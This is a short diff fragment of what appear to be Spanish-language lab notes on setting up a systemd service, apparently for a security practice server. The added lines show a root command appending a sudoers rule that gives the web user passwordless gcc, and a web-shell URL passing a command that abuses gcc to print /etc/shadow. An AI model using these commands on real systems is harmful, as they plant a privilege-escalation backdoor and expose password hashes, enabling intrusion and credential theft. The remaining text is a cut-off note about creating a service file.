@@ -1,3 +1,34 @@
+root@donhackmenow:/home/user1# echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/gcc" >> /etc/sudoers
+http://localhost/SERVER-SEGURIDAD/upload/upload.php?cmd=sudo%20gcc%20-x%20c%20-E%20%22/etc/shadow%22
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 hay que crear un nuevo servicio
  sudo nano /etc/systemd/system/mi_script.service
 con el contenido 
